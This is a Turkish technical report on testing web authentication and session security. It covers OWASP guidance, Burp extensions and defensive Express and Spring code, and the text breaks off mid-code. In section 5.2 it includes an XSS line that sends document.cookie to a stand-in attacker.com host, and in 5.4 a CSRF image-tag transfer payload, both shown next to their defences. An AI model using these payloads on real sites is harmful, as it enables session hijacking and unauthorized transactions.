Auth Session Security Analyzer - Teknik Araştırma Raporu
1. Temel Çalışma Prensipleri
Auth Session Security Analyzer, web uygulamalarında kimlik doğrulama (authentication) ve oturum yönetimi (session management) mekanizmalarının güvenliğini analiz etmeyi amaçlayan bir yaklaşımdır.
1.1 Çalışma Mekanizması
Otomatik İstek Tekrarı

Yüksek yetkili kullanıcı ile web uygulamasında gezinme yapılır
Araç, bu istekleri otomatik olarak yakalar
Yakalanan istekler, düşük yetkili kullanıcıların oturum bilgileriyle tekrar gönderilir
Her yanıt analiz edilir ve bypass durumu etiketlenir

Parametre Yönetimi

CSRF token'ları otomatik olarak yanıtlardan çıkarılır
Oturum karakteristikleri otomatik olarak işlenir
HTML Input Tag'leri, Set-Cookie Header'ları ve JSON yanıtlarından dinamik değerler çıkarılır

Session ID Validasyonu
Admin Kullanıcı → SessionID_A → GET /admin → HTTP 200 OK → Beklenen ✓
Normal Kullanıcı → SessionID_B → GET /admin → HTTP 403 → Beklenen ✓
Normal Kullanıcı → SessionID_B → GET /admin → HTTP 200 OK → Güvenlik Açığı! ✗
1.2 Tespit Edilen Güvenlik Açıkları

Broken Access Control (BAC): Yetkisiz erişim kontrolü zafiyetleri
Insecure Direct Object References (IDOR): Güvensiz doğrudan nesne referansları
Horizontal Privilege Escalation: Yatay yetki yükseltme
Vertical Privilege Escalation: Dikey yetki yükseltme
Session Fixation: Oturum sabitleme
Session Hijacking: Oturum ele geçirme
CSRF Token Bypass: CSRF token atlama


2. Best Practices ve Endüstri Standartları
2.1 OWASP Session Management Standartları
Session ID Üretimi Gereksinimleri

Entropi: En az 128 bit
CSPRNG: Kriptografik olarak güvenli rastgele sayı üreteci kullanımı
Tahmin Edilemezlik: İstatistiksel ve kriptografik analize dirençli olmalı
Benzersizlik: Her oturum için tekil olmalı

Kaynak: OWASP Session Management Cheat Sheet
Session ID Özellikleri
ÖzellikÖneriAçıklamaUzunlukMinimum 128 bitBrute force saldırılarına karşı korumaKarmaşıklıkYüksek entropiTahmin edilemezlik sağlarYaşam SüresiKısa, risk bazlıÇalınan token'ların etkisini azaltırİletimSadece HTTPSMITM saldırılarına karşı korumaDepolamaSunucu tarafıClient-side manipülasyonu önler
2.2 Cookie Güvenliği
Kritik Cookie Attribute'ları
httpSet-Cookie: sessionId=abc123xyz; 
    Secure;              # Sadece HTTPS üzerinden iletim
    HttpOnly;            # JavaScript erişimini engeller (XSS koruması)
    SameSite=Strict;     # CSRF saldırılarına karşı koruma
    Path=/;              # Cookie'nin geçerli olduğu yol
    Max-Age=3600;        # 1 saat timeout
    Domain=example.com   # Cookie'nin geçerli olduğu domain
Kaynak: OWASP Session Management Testing
2.3 Session Lifecycle Yönetimi
Oturum Evreleri
Session Creation (Oluşturma)

Güvenli session ID üretimi
İlk oturum parametrelerinin belirlenmesi
Güvenli cookie ayarları

Session Maintenance (Sürdürme)

Düzenli session ID yenileme
Timeout yönetimi
Aktivite takibi

Session Termination (Sonlandırma)

Logout sonrası sunucu tarafında invalidation
Cookie temizleme
Session data silme

Kaynak: SuperTokens Session Security
2.4 Authorization Testing Workflow

Role Definition: Tüm kullanıcı rollerini tanımlayın
Access Matrix: Erişim matrisini oluşturun
Automated Testing: Auth Analyzer ile otomatik testler
Manual Verification: Kritik fonksiyonları manuel doğrulayın
Regression Testing: Düzenli regresyon testleri

Access Control Matrix Örneği
EndpointAdminManagerUserGuest/admin/users✓✗✗✗/manager/reports✓✓✗✗/user/profile✓✓✓✗/public/home✓✓✓✓
2.5 Endüstri Standartları
PCI DSS v4.0 Gereksinimleri

Requirement 8.2.8: Inaktif oturum 15 dakika sonra otomatik sonlandırma
Çoklu faktör kimlik doğrulama (MFA) zorunluluğu
Güçlü şifre politikaları

NIST Guidelines

Session timeout süreleri risk bazlı belirlenmeli
Re-authentication kritik işlemler öncesi
Session monitoring ve anomali tespiti

Kaynak: Descope Session Management

3. Benzer Açık Kaynak Projeler ve Rakipler
3.1 Burp Suite Eklentileri
Autorize

GitHub: https://github.com/Quitten/Autorize
Dil: Jython (Python for Java)
Özellikler:

Otomatik authorization testleri
Basit kullanıcı arayüzü
Regex tabanlı yanıt analizi
Domain filtreleme



Artıları: Kolay kurulum, düşük yetkili kullanıcı için otomatik test, scope-based filtering
Eksileri: Sınırlı metin değiştirme, karmaşık authorization senaryoları için yetersiz
Kaynak: Authorization Testing with BurpSuite
AuthMatrix

GitHub: https://github.com/PortSwigger/auth-matrix
Dil: Jython
Özellikler:

Çoklu rol ve kullanıcı desteği
Access Control Matrix görünümü
Chain functionality (dinamik değer kopyalama)
Response Regex özelleştirme



Artıları: Karmaşık authorization şemaları için ideal, çoklu rol testi, cross-user resource testing
Eksileri: Karmaşık kurulum süreci, daha fazla ön yapılandırma gereksinimi
Kaynak: GitHub - Auth Matrix
AutoRepeater

GitHub: https://github.com/nccgroup/AutoRepeater
Geliştirici: NCC Group
Özellikler:

General-purpose text replacement
Request/Response diff viewer
Base replacements (CSRF, cookies)
Burp UI ile uyumlu
Streamlined authorization testing



Artıları: En kapsamlı özellik seti, Burp'ün tanıdık UI'ı, CSRF token ve session cookie yönetimi
Eksileri: BApp store versiyonu güncel olmayabilir, Git'ten kurulum önerilir
Kaynak: GitHub - AutoRepeater
3.2 Bağımsız Güvenlik Test Araçları
OWASP ZAP (Zed Attack Proxy)

GitHub: https://github.com/zaproxy/zaproxy
Dil: Java
Lisans: Apache 2.0
Özellikler:

Session management testing
Access control testing
Automated scanning
Extension marketplace
Cross-platform (Windows, Linux, macOS)



Session Testing Özellikleri: Session token analysis, cookie inspection, authentication testing, built-in session handling rules
Kaynak: OWASP ZAP Project
Nuclei

GitHub: https://github.com/projectdiscovery/nuclei
Dil: Go
Lisans: MIT
Özellikler:

Template-based scanning
Custom template creation
API ve web app testing
CI/CD entegrasyonu



Kaynak: AIMultiple Open Source Audit Tools
3.3 Karşılaştırma Tablosu
AraçPlatformOtomatik TestÇoklu RolCSRF SupportLearning CurveAktif GeliştirmeAuth AnalyzerBurp Suite✓✓✓✓Düşük✓AutorizeBurp Suite✓✗✓Çok Düşük✓AuthMatrixBurp Suite✓✓✓✓Orta✓AutoRepeaterBurp Suite✓✓✓✓✓Orta✓OWASP ZAPStandalone✓✓✓✓Orta✓✓NucleiCLI✓✗✓Orta-Yüksek✓✓

4. Kritik Yapılandırma Dosyaları ve Parametreleri
4.1 Auth Analyzer Yapılandırması
Session Tanımlama (JSON Format)
json{
  "sessions": [
    {
      "name": "Admin User",
      "role": "administrator",
      "parameters": [
        {
          "name": "sessionId",
          "type": "cookie",
          "extract": "auto",
          "value": "admin_session_token_here"
        },
        {
          "name": "csrf_token",
          "type": "parameter",
          "extract": "auto",
          "from_string": "csrf-token\" value=\"",
          "to_string": "\""
        }
      ]
    },
    {
      "name": "Regular User",
      "role": "user",
      "parameters": [
        {
          "name": "sessionId",
          "type": "cookie",
          "extract": "auto",
          "value": "user_session_token_here"
        }
      ]
    }
  ]
}
Parameter Types
Static Parameters
username: "testuser"
password: "testpassword"
Auto Extract Parameters

HTML Input Tags: <input name="csrf" value="token123">
JSON Response: {"csrf": "token123"}
Set-Cookie Header: Set-Cookie: csrf=token123
Custom Regex: csrf-token\" value=\"([^\"]+)\"

From-To Extract Parameters
From String: "csrf-token\" value=\""
To String: "\""
Result: Extracts token between these strings
4.2 Burp Suite Session Handling Rules
Rule Configuration (XML Format)
xml<session_handling_rule>
    <name>Auto CSRF Token Update</name>
    <enabled>true</enabled>
    <actions>
        <action type="use_cookies_from_burp_jar"/>
        <action type="run_macro">
            <macro_id>csrf_refresh_macro</macro_id>
        </action>
    </actions>
    <scope>
        <include_all_urls>true</include_all_urls>
        <tools>
            <tool>Repeater</tool>
            <tool>Scanner</tool>
            <tool>Intruder</tool>
        </tools>
    </scope>
</session_handling_rule>
4.3 Authorization Matrix Configuration
Access Control Matrix (YAML Format)
yamlroles:
  - name: "Administrator"
    id: "admin"
    permissions:
      - "READ_ALL"
      - "WRITE_ALL"
      - "DELETE_ALL"
      - "MANAGE_USERS"
  
  - name: "Manager"
    id: "manager"
    permissions:
      - "READ_ALL"
      - "WRITE_DEPARTMENT"
      - "READ_REPORTS"
  
  - name: "User"
    id: "user"
    permissions:
      - "READ_OWN"
      - "WRITE_OWN"

endpoints:
  - path: "/api/users"
    method: "GET"
    allowed_roles: ["admin", "manager"]
    
  - path: "/api/users/:id"
    method: "PUT"
    allowed_roles: ["admin"]
    ownership_check: true
    
  - path: "/api/profile"
    method: "GET"
    allowed_roles: ["admin", "manager", "user"]
4.4 Kritik Parametreler
Session Management (Properties Format)
properties# Session Timeout Settings
session.timeout.idle=1800          # 30 dakika (seconds)
session.timeout.absolute=28800     # 8 saat (seconds)
session.timeout.warning=120        # 2 dakika önce uyarı

# Session ID Configuration
session.id.length=32               # 256 bit (32 bytes hex)
session.id.algorithm=SHA256
session.id.secure=true
session.id.httponly=true
session.id.samesite=Strict

# Session Storage
session.storage.type=server        # server/client/hybrid
session.storage.encrypt=true
session.storage.key.rotation=86400 # 24 saat
Express.js Cookie Configuration
javascriptconst sessionConfig = {
    name: 'sid',
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,               // Sadece HTTPS
        httpOnly: true,             // XSS koruması
        maxAge: 1800000,            // 30 dakika
        sameSite: 'strict',         // CSRF koruması
        domain: '.example.com',
        path: '/'
    },
    rolling: true                   // Her istekte yenile
};
Spring Security Configuration
java@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
                .invalidSessionUrl("/login?invalid-session")
                .maximumSessions(1)
                    .maxSessionsPreventsLogin(true)
                    .expiredUrl("/login?expired")
                .and()
                .sessionFixation()
                    .newSession()
            .and()
            .csrf()
                .csrfTokenRepository(
                    CookieCsrfTokenRepository.withHttpOnlyFalse()
                );
        return http.build();
    }
}
Kaynak: Spring Security Session Management

5. Güvenlik Açısından Kritik Noktalar
5.1 Session Fixation Saldırıları
Saldırı Senaryosu
1. Saldırgan → Session Oluşturur → SID: ABC123
2. Saldırgan → Link Gönderir → Kurban (SID: ABC123 ile)
3. Kurban → Link'e Tıklar → Giriş Yapar (SID: ABC123 devam eder)
4. Saldırgan → SID: ABC123 Kullanır → Kurbanın Session'ına Erişir ✗
Korunma Yöntemleri
javascript// Login sonrası session ID yenileme
app.post('/login', (req, res) => {
    if (validCredentials) {
        // Session fixation koruması
        req.session.regenerate((err) => {
            req.session.userId = user.id;
            req.session.role = user.role;
            res.redirect('/dashboard');
        });
    }
});

// Logout sonrası session destroy
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        res.clearCookie('sid');
        res.redirect('/login');
    });
});
Kaynak: Coveros Session Management
5.2 Session Hijacking
Saldırı Vektörleri
Network Sniffing (MITM)

Saldırı: HTTP trafiğinin dinlenmesi
Risk: Session token'ların düz metin olarak iletimi
Önlem: HTTPS zorunluluğu, HSTS implementasyonu

XSS-based Theft
javascript// Saldırı: XSS ile cookie çalma
<script>
document.location='http://attacker.com/steal.php?c='+document.cookie;
</script>

// Korunma: HttpOnly flag
Set-Cookie: sessionId=xyz; HttpOnly; Secure; SameSite=Strict
Session Prediction
Zayıf: sessionId = timestamp + userId
Güçlü: sessionId = CSPRNG(256 bits)

Tahmin Süresi (10,000 deneme/saniye):
64 bit:  ~58,494 yıl
128 bit: ~10^26 yıl (pratikte imkansız)
Güvenli Session ID Üretimi
pythonimport secrets

def generate_secure_session_id():
    """
    CSPRNG kullanarak 256 bit güvenli session ID üretir
    """
    return secrets.token_urlsafe(32)  # 256 bit

def validate_session(session_id, request):
    session = get_session(session_id)
    
    if not session:
        return False
    
    # IP adresi kontrolü (opsiyonel)
    if session.ip_address != request.ip_address:
        log_suspicious_activity(session_id, "IP mismatch")
        return False
    
    # User-Agent kontrolü
    if session.user_agent != request.user_agent:
        log_suspicious_activity(session_id, "User-Agent mismatch")
        return False
    
    # Son aktivite kontrolü
    if (current_time() - session.last_activity) > IDLE_TIMEOUT:
        destroy_session(session_id)
        return False
    
    session.last_activity = current_time()
    return True
Kaynak: 1Kosmos Session Management
5.3 Broken Access Control
IDOR (Insecure Direct Object Reference)
http# Güvensiz
GET /api/users/123/profile HTTP/1.1
Cookie: sessionId=user456_session

Response: 200 OK
{
  "id": 123,
  "name": "John Doe",
  "ssn": "123-45-6789"  ✗ Başka kullanıcının verisi!
}

# Güvenli - Server-side check
if (session.userId !== requestedUserId) {
    return 403 Forbidden;
}
Function Level Access Control
javascript// Güvensiz - Sadece client-side kontrol
if (user.role === 'admin') {
    showAdminPanel();  ✗
}

// Güvenli - Server-side enforcement
app.get('/admin/users', requireRole('admin'), (req, res) => {
    // Admin fonksiyonları
});

function requireRole(role) {
    return (req, res, next) => {
        if (req.session.role !== role) {
            return res.status(403).json({
                error: 'Insufficient permissions'
            });
        }
        next();
    };
}
Test Edilmesi Gereken Senaryolar
SenaryoTestBeklenen SonuçYatay Yetki YükseltmeUser A → User B'nin kaynağına erişim403 ForbiddenDikey Yetki YükseltmeUser → Admin endpoint erişimi403 ForbiddenIDORUser A → /api/documents/456 (User B'nin)403 ForbiddenSession OlmadanGuest → Protected resource401 UnauthorizedExpired SessionEski token → Protected resource401 Unauthorized
Kaynak: OWASP Mobile Top 10
5.4 CSRF (Cross-Site Request Forgery)
Saldırı Örneği
html<!-- Saldırganın Web Sitesi -->
<img src="https://bank.com/transfer?amount=1000&to=attacker_account">

<!-- Kurban ziyaret eder, authenticated session ile istek gönderilir -->
Anti-CSRF Token Implementasyonu
javascript// Server-side (Express.js)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', (req, res) => {
    // CSRF token otomatik doğrulanır
    processTransfer(req.body);
});

// Client-side
<form method="POST" action="/transfer">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="text" name="amount">
    <button type="submit">Transfer</button>
</form>
SameSite Cookie Attribute
httpSet-Cookie: sessionId=abc123; SameSite=Strict

Options:
- Strict: Hiçbir cross-site request'te gönderilmez
- Lax: Top-level navigation'da gönderilir (GET)
- None: Tüm cross-site request'lerde gönderilir (Secure gerekli)
Kaynak: Authgear Session vs Token Authentication
5.5 Session Timeout Yönetimi
Risk Matrisi
┌─────────────────────┬──────────────────┬─────────────────┐
│ Timeout Süresi      │ Kullanıcı Deneyimi│ Güvenlik Riski │
├─────────────────────┼──────────────────┼─────────────────┤
│ Çok Kısa (<5 dk)    │ Kötü             │ Düşük          │
│ Orta (15-30 dk)     │ İyi              │ Orta           │
│ Uzun (>2 saat)      │ Çok İyi          │ Yüksek         │
│ Timeout Yok         │ Mükemmel         │ Çok Yüksek ✗   │
└─────────────────────┴──────────────────┴─────────────────┘
Risk-Based Timeout Stratejisi
javascriptconst timeoutConfig = {
    'anonymous': 3600,        // 1 saat
    'user': 1800,             // 30 dakika
    'financial': 900,         // 15 dakika
    'admin': 600,             // 10 dakika
    'privileged_admin': 300   // 5 dakika
};

// Sliding window (her aktivitede yenilenir)
function updateSessionActivity(sessionId) {
    session.lastActivity = Date.now();
    session.expiresAt = Date.now() + timeoutConfig[session.role] * 1000;
}

// Absolute timeout (maksimum oturum süresi)
function checkAbsoluteTimeout(session) {
    const MAX_SESSION_LIFETIME = 8 * 3600 * 1000; // 8 saat
    if (Date.now() - session.createdAt > MAX_SESSION_LIFETIME) {
        destroySession(session.id);
        return false;
    }
    return true;
}
Kaynak: Descope Session Management
5.6 Token Storage Güvenliği
Storage Comparison
Depolama YöntemiXSS RiskiCSRF RiskiOtomatik GönderimÖnerilenlocalStorageYüksek ✗DüşükHayır✗sessionStorageYüksek ✗DüşükHayır✗Cookie (HttpOnly)DüşükOrtaEvet✓Cookie (HttpOnly + SameSite)DüşükDüşükEvet✓✓Memory OnlyÇok DüşükYokHayır✓ (SPA için)
En İyi Uygulama
javascript// ✗ Güvensiz - localStorage
localStorage.setItem('token', authToken);

// ✗ Güvensiz - JavaScript erişilebilir cookie
document.cookie = `token=${authToken}`;

// ✓ Güvenli - HttpOnly cookie (server-side set)
res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 1800000,
    signed: true
});
Kaynak: Auth0 Token Storage
5.7 Multi-Factor Authentication (MFA) Entegrasyonu
Session Management + MFA
javascriptapp.post('/login', async (req, res) => {
    const user = await authenticateUser(req.body);
    
    if (user && user.mfaEnabled) {
        // Geçici session - MFA tamamlanmamış
        req.session.pendingMfa = {
            userId: user.id,
            timestamp: Date.now(),
            attempts: 0
        };
        return res.json({ requiresMfa: true });
    }
    
    createFullSession(user, req);
});

app.post('/verify-mfa', (req, res) => {
    const pending = req.session.pendingMfa;
    
    if (!pending || Date.now() - pending.timestamp > 300000) {
        return res.status(401).json({ error: 'MFA expired' });
    }
    
    if (verifyMfaCode(req.body.code, pending.userId)) {
        delete req.session.pendingMfa;
        createFullSession(user, req);
    } else {
        pending.attempts++;
        if (pending.attempts >= 3) {
            req.session.destroy();
        }
    }
});
5.8 Session Invalidation Strategies
Kritik Olaylar Sonrası Invalidation
javascript// Şifre değişikliği
app.post('/change-password', requireAuth, async (req, res) => {
    await updatePassword(req.session.userId, req.body.newPassword);
    await invalidateAllUserSessions(req.session.userId);
    
    req.session.regenerate(() => {
        createNewSession(req);
    });
});

// Şüpheli aktivite tespiti
async function detectSuspiciousActivity(session) {
    const checks = [
        checkUnusualLocation(session),
        checkDeviceFingerprint(session),
        checkRequestFrequency(session),
        checkAccessPattern(session)
    ];
    
    if (checks.some(c => c.suspicious)) {
        await invalidateSession(session.id);
        await notifyUser(session.userId, 'Suspicious activity detected');
    }
}

// Admin tarafından zorla çıkış
app.post('/admin/logout-user/:userId', requireRole('admin'), async (req,
